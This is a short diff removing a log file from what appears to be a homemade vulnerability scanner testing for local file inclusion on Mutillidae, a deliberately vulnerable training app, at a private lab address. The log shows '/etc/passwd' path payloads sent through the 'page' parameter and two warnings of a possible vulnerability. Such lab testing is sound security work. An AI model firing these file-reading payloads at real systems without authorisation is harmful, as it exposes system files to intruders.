@@ -1,8 +1,0 @@
-2024-04-12 15:42:22,907 - INFO - 
-Starting ScanLocalFileInclusion scan
-2024-04-12 15:42:22,935 - INFO - 	Testing payload: etc/passwd on http://192.168.232.129:80/mutillidae/index.php as http://192.168.232.129:80/mutillidae/index.php?page=etc%2Fpasswd
-2024-04-12 15:42:22,964 - INFO - 	Testing payload: /etc/passwd on http://192.168.232.129:80/mutillidae/index.php as http://192.168.232.129:80/mutillidae/index.php?page=%2Fetc%2Fpasswd
-2024-04-12 15:42:22,991 - WARNING - 	Potential local file inclusion vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=%2Fetc%2Fpasswd with payload: /etc/passwd
-2024-04-12 15:42:23,018 - INFO - 	Testing payload: etc/passwd on http://192.168.232.129:80/mutillidae/ as http://192.168.232.129:80/mutillidae/?page=etc%2Fpasswd
-2024-04-12 15:42:23,045 - INFO - 	Testing payload: /etc/passwd on http://192.168.232.129:80/mutillidae/ as http://192.168.232.129:80/mutillidae/?page=%2Fetc%2Fpasswd
-2024-04-12 15:42:23,072 - WARNING - 	Potential local file inclusion vulnerability found at: http://192.168.232.129:80/mutillidae/?page=%2Fetc%2Fpasswd with payload: /etc/passwd
